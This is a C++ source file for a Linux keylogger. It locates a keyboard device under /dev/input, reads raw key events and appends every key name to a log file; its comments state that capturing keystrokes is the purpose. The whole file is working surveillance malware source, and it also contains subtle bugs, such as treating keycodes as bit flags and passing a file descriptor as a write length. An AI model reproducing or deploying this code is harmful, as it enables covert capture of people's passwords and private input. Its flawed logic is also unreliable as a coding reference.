#include <iostream>
#include <fstream>
#include <sys/stat.h>
#include <sys/dir.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <string>
#include <dirent.h>
#include <fcntl.h>
#include <signal.h>
#include <unistd.h>
#include <linux/input.h>
#include <string.h>

#define NUM_KEYCODES 71

using namespace std;

// Create a keylogger that reads raw binary input from the keyboard and logs it into a log file
// If possible, use the pre-defined keylogger.c to not re-invent the wheel
// usage: ./keylogger output_log.txt <-- the output file to store the logged data

const char * keycodes[] = {
    "RESERVED",
    "ESC",
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "0",
    "MINUS",
    "EQUAL",
    "BACKSPACE",
    "TAB",
    "Q",
    "W",
    "E",
    "R",
    "T",
    "Y",
    "U",
    "I",
    "O",
    "P",
    "LEFTBRACE",
    "RIGHTBRACE",
    "ENTER",
    "LEFTCTRL",
    "A",
    "S",
    "D",
    "F",
    "G",
    "H",
    "J",
    "K",
    "L",
    "SEMICOLON",
    "APOSTROPHE",
    "GRAVE",
    "LEFTSHIFT",
    "BACKSLASH",
    "Z",
    "X",
    "C",
    "V",
    "B",
    "N",
    "M",
    "COMMA",
    "DOT",
    "SLASH",
    "RIGHTSHIFT",
    "KPASTERISK",
    "LEFTALT",
    "SPACE",
    "CAPSLOCK",
    "F1",
    "F2",
    "F3",
    "F4",
    "F5",
    "F6",
    "F7",
    "F8",
    "F9",
    "F10",
    "NUMLOCK",
    "SCROLLLOCK"
};

void show_usage_and_exit(char* char_pt){
    fprintf(stderr, "Usage: %s output_file\n", char_pt);
    exit(1);
}

int write_all(int file_desc, const char * str){
    int bytesWritten = 0;
    int bytesToWrite = strlen(str) + 1;

    do {
        bytesWritten = write(file_desc, str, bytesToWrite);

        if(bytesWritten == -1){
            return 0;
        }
        bytesToWrite -= bytesWritten;
        str += bytesWritten;
    } while(bytesToWrite > 0);

    return 1;
}

void write_to_out(int outfd, const char * str, int keyboard_fd){
    if (!write_all(outfd, str)){
        close(outfd);
        close(keyboard_fd);
        perror("write");
        exit(1);
    }
}

void keylogger_init(int keyboard_fd, int outfd){
    int event_size = sizeof(struct input_event);
    int bytes_read = 0;
    struct input_event events[128]; // replace 128 with NUM_EVENTS
    int i;

    // write signal handler for sigint etc

    while(true){
        bytes_read = read(keyboard_fd, events, event_size * 128);

        for (int i = 0; i < (bytes_read/event_size); ++i){
            if (events[i].type == EV_KEY){
                if (events[i].value == 1){
                    if (events[i].code > 0 && events[i].code < NUM_KEYCODES){
                        write_to_out(outfd, keycodes[events[i].code], keyboard_fd);
                        write_to_out(outfd, "\n", keyboard_fd);
                    } else {
                        write(outfd, "UNRECOGNIZED\n", sizeof("UNRECOGNIZED\n"));
                    }
                }
            }
        }
    }
    if (bytes_read > 0){
        write(outfd, "\n", keyboard_fd);
    }
}

int is_keyboard_device(const struct dirent * file){
    struct stat filestat;
    char filename[512];

    snprintf(filename, sizeof(filename), "%s%s", "/dev/input/", file->d_name);

    int error = stat(filename, &filestat);
    if (error){
        return 0;
    }
    return S_ISCHR(filestat.st_mode);
}

char * obtain_event_file(){
    char * keyboard_file = NULL;
    struct dirent ** event_files;
    char filename[512];

    int num = scandir("/dev/input/", &event_files, &is_keyboard_device, &alphasort); 
    if (num < 0){
        return NULL;
    } else {
        for (int i = 0; i < num; i++){
            int32_t event_bitmap = 0;
            int fd;
            int32_t keyboard_bitmap = KEY_A | KEY_B | KEY_C | KEY_Z;

            snprintf(filename, sizeof(filename), "%s%s", "/dev/input/", event_files[i]->d_name);
            
            int keyboard_fd = open(filename,O_RDONLY);

            if (keyboard_fd < 0){
                perror("open");
                continue;
            }

            ioctl(keyboard_fd, EVIOCGBIT(0, sizeof(event_bitmap)), &event_bitmap);
            if ((EV_KEY & event_bitmap) == EV_KEY){
                // behaves like a keyboard
                ioctl(keyboard_fd, EVIOCGBIT(EV_KEY, sizeof(event_bitmap)), &event_bitmap);
                if ((keyboard_bitmap & event_bitmap) == keyboard_bitmap){
                    // device supports A, B, C, Z, so its probably a keyboard
                    keyboard_file = strdup(filename);
                    close(keyboard_fd);
                    break;
                }
            }

            close(keyboard_fd);
        }
    }
    for (int i = 0; i < num; i++){
        free(event_files[i]);
    }
    free(event_files);
    return keyboard_file;
}

int main(int argc, char ** argv){
    //check usage
    if (argc < 2){
        show_usage_and_exit(argv[0]);
    }

    //check /dev/input directory for the keyboard input file
    char * keyboard_device = obtain_event_file();
    printf("keyboard file: %s\n", keyboard_device);
    if (keyboard_device == NULL){
        fprintf(stderr, "Error: Keyboard device not connected.");
        exit(1);
    }

    int output_fd;
    output_fd = open(argv[1], O_WRONLY|O_APPEND|O_CREAT, S_IROTH);
    if (output_fd < 0){
        perror("output file: open");
    }

    int keyboard_fd = open(keyboard_device, O_RDONLY);
    if (keyboard_fd < 0){
        perror("keyboard file: open");
    }

    keylogger_init(keyboard_fd, output_fd);

    close(keyboard_fd);
    close(output_fd);
    free(keyboard_device);

    return 0;
}